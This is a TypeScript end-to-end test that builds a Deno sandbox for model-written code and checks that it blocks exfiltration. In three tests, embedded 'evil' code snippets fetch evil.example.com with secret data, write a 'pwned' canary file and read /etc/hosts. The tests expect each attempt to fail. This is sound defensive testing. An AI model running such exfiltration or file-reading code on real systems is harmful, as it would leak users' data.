// packages/cli/test/emit-sandbox-e2e.test.ts
//
// LOAD-BEARING test for MCPFO-30 — per the repo's standing rule (CLAUDE.md),
// string-shape unit tests are not sufficient for the actual sandbox boundary.
// This really emits the typed client + sandbox runner, compiles them with
// tsc, spawns a REAL Deno subprocess (requires `deno` on PATH — installed
// via `brew install deno` for this work, ARCHITECTURE.md section 45) against
// a local mock HTTP server, and proves both:
//   1. the happy path: model-written code importing the generated client
//      can reach the (permitted) API host and get real data back;
//   2. every attempted exfiltration vector from *inside* the sandbox is
//      actually blocked by Deno's permission model, not just "should be" —
//      cross-host fetch, arbitrary file write, arbitrary file read.
// This mirrors the manual proof-of-concept run during MCPFO-30's design
// (ARCHITECTURE.md section 45) as an automated, repeatable regression test.

import { test } from "node:test";
import assert from "node:assert/strict";
import { fileURLToPath } from "node:url";
import path from "node:path";
import { mkdtemp, rm, writeFile, mkdir, access } from "node:fs/promises";
import { tmpdir } from "node:os";
import { execFile, spawn } from "node:child_process";
import { promisify } from "node:util";
import { createServer } from "node:http";
import { getToolsFromOpenApi } from "openapi-mcp-generator";
import { emitClientModule } from "../src/emit/emit-client.js";
import { emitSandboxRunner, extractApiHost, buildDenoPermissionFlags } from "../src/emit/emit-sandbox.js";

const execFileAsync = promisify(execFile);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PETSTORE_SPEC_PATH = path.resolve(__dirname, "../../../../examples/petstore/openapi.json");

async function isDenoAvailable(): Promise<boolean> {
  try {
    await execFileAsync("deno", ["--version"]);
    return true;
  } catch {
    return false;
  }
}

async function startMockApi(): Promise<{ baseUrl: string; close: () => Promise<void> }> {
  const server = createServer((req, res) => {
    const match = req.url?.match(/^\/pet\/(\d+)$/);
    if (req.method === "GET" && match) {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ id: Number(match[1]), name: "doggie", status: "available" }));
      return;
    }
    res.writeHead(404, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ code: 404, message: "Not Found" }));
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  const port = typeof address === "object" && address ? address.port : 0;
  return {
    baseUrl: `http://127.0.0.1:${port}`,
    close: () => new Promise<void>((resolve) => server.close(() => resolve())),
  };
}

/** Builds a real compiled sandbox project (client.js + sandbox-runner.js) and returns its dist dir. */
async function buildSandboxProject(): Promise<string> {
  const outDir = await mkdtemp(path.join(tmpdir(), "klaridian-sandbox-e2e-"));
  const tools = await getToolsFromOpenApi(PETSTORE_SPEC_PATH, { dereference: true });
  await mkdir(path.join(outDir, "src"), { recursive: true });
  await writeFile(path.join(outDir, "src", "client.ts"), emitClientModule(tools), "utf-8");
  await writeFile(path.join(outDir, "src", "sandbox-runner.ts"), emitSandboxRunner(), "utf-8");

  const pkg = {
    name: "klaridian-sandbox-e2e",
    version: "1.0.0",
    private: true,
    type: "module",
    dependencies: { zod: "^4.2.0" },
    devDependencies: { typescript: "^5.7.3", "@types/node": "^22.10.5" },
  };
  await writeFile(path.join(outDir, "package.json"), JSON.stringify(pkg, null, 2), "utf-8");
  const tsconfig = {
    compilerOptions: {
      target: "ES2022", module: "NodeNext", moduleResolution: "NodeNext",
      outDir: "dist", rootDir: "src", strict: true, esModuleInterop: true,
      skipLibCheck: true, types: ["node"],
    },
    include: ["src/**/*.ts"],
  };
  await writeFile(path.join(outDir, "tsconfig.json"), JSON.stringify(tsconfig, null, 2), "utf-8");

  await execFileAsync("npm", ["install", "--no-audit", "--no-fund"], { cwd: outDir, timeout: 180_000 });
  await execFileAsync("npx", ["tsc", "-p", "tsconfig.json"], { cwd: outDir, timeout: 60_000 });
  return outDir;
}

/** Runs `code` via a real `deno run` subprocess with the sandbox's real permission flags, cwd'd into distDir (mirrors sandbox-runner.ts's own spawn). */
function runSandboxed(code: string, apiHost: string, distDir: string): Promise<{ code: number | null; stdout: string; stderr: string }> {
  return new Promise((resolve) => {
    const args = ["run", ...buildDenoPermissionFlags({ apiHost, distDir }), "-"];
    const child = spawn("deno", args, { cwd: distDir, stdio: ["pipe", "pipe", "pipe"] });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (c: Buffer) => { stdout += c.toString("utf-8"); });
    child.stderr.on("data", (c: Buffer) => { stderr += c.toString("utf-8"); });
    child.on("close", (exitCode) => resolve({ code: exitCode, stdout, stderr }));
    child.stdin.write(code);
    child.stdin.end();
  });
}

test(
  "execute_code sandbox: happy path — model code can call the typed client and reach the permitted API host",
  { timeout: 300_000 },
  async () => {
    if (!(await isDenoAvailable())) {
      console.log("SKIP: deno not on PATH (install with `brew install deno`)");
      return;
    }
    const mock = await startMockApi();
    const distDir = await buildSandboxProject();
    try {
      const apiHost = extractApiHost(mock.baseUrl);
      const modelCode = `
import { getPetById } from "./client.js";
const result = await getPetById({ petId: 7 });
console.log(JSON.stringify(result));
`;
      const distSubdir = path.join(distDir, "dist");
      const args = ["run", ...buildDenoPermissionFlags({ apiHost, distDir: distSubdir }), "-"];
      const result = await new Promise<{ code: number | null; stdout: string; stderr: string }>((resolve) => {
        const child = spawn("deno", args, {
          cwd: distSubdir,
          stdio: ["pipe", "pipe", "pipe"],
          env: { PATH: process.env.PATH ?? "", KLARIDIAN_BASE_URL: mock.baseUrl },
        });
        let so = "", se = "";
        child.stdout.on("data", (c: Buffer) => { so += c.toString("utf-8"); });
        child.stderr.on("data", (c: Buffer) => { se += c.toString("utf-8"); });
        child.on("close", (exitCode) => resolve({ code: exitCode, stdout: so, stderr: se }));
        child.stdin.write(modelCode);
        child.stdin.end();
      });
      assert.equal(result.code, 0, `sandboxed execution should succeed, stderr: ${result.stderr}`);
      const parsed = JSON.parse(result.stdout.trim());
      assert.equal(parsed.status, 200);
      assert.equal(parsed.data.id, 7);
    } finally {
      await mock.close();
      await rm(distDir, { recursive: true, force: true });
    }
  }
);

test(
  "execute_code sandbox: blocks a cross-host fetch attempt (exfiltration vector 1)",
  { timeout: 300_000 },
  async () => {
    if (!(await isDenoAvailable())) { console.log("SKIP: deno not on PATH"); return; }
    const distDir = await buildSandboxProject();
    try {
      const evilCode = `
try {
  const r = await fetch("https://evil.example.com/steal?data=secret");
  console.log(JSON.stringify({ leaked: true, status: r.status }));
} catch (err) {
  console.log(JSON.stringify({ leaked: false, error: String(err) }));
}
`;
      const { stdout } = await runSandboxed(evilCode, "127.0.0.1:1", path.join(distDir, "dist"));
      const parsed = JSON.parse(stdout.trim());
      assert.equal(parsed.leaked, false, "cross-host fetch must be blocked by --allow-net scoping");
      assert.match(parsed.error, /NotCapable|allow-net/i);
    } finally {
      await rm(distDir, { recursive: true, force: true });
    }
  }
);

test(
  "execute_code sandbox: blocks arbitrary file writes (exfiltration vector 2)",
  { timeout: 300_000 },
  async () => {
    if (!(await isDenoAvailable())) { console.log("SKIP: deno not on PATH"); return; }
    const distDir = await buildSandboxProject();
    const canaryPath = path.join(tmpdir(), `klaridian-sandbox-canary-${Date.now()}.txt`);
    try {
      const evilCode = `
try {
  await Deno.writeTextFile(${JSON.stringify(canaryPath)}, "pwned");
  console.log(JSON.stringify({ wrote: true }));
} catch (err) {
  console.log(JSON.stringify({ wrote: false, error: String(err) }));
}
`;
      const { stdout } = await runSandboxed(evilCode, "127.0.0.1:1", path.join(distDir, "dist"));
      const parsed = JSON.parse(stdout.trim());
      assert.equal(parsed.wrote, false, "arbitrary file write must be blocked (--allow-write is never granted)");
      assert.match(parsed.error, /NotCapable|allow-write/i);
      await assert.rejects(access(canaryPath), "canary file must not have been created");
    } finally {
      await rm(distDir, { recursive: true, force: true });
    }
  }
);

test(
  "execute_code sandbox: blocks reading files outside the generated project's dist dir (exfiltration vector 3)",
  { timeout: 300_000 },
  async () => {
    if (!(await isDenoAvailable())) { console.log("SKIP: deno not on PATH"); return; }
    const distDir = await buildSandboxProject();
    try {
      const evilCode = `
try {
  const t = await Deno.readTextFile("/etc/hosts");
  console.log(JSON.stringify({ read: true, len: t.length }));
} catch (err) {
  console.log(JSON.stringify({ read: false, error: String(err) }));
}
`;
      const { stdout } = await runSandboxed(evilCode, "127.0.0.1:1", path.join(distDir, "dist"));
      const parsed = JSON.parse(stdout.trim());
      assert.equal(parsed.read, false, "reading files outside the sandboxed dist dir must be blocked");
      assert.match(parsed.error, /NotCapable|allow-read/i);
    } finally {
      await rm(distDir, { recursive: true, force: true });
    }
  }
);
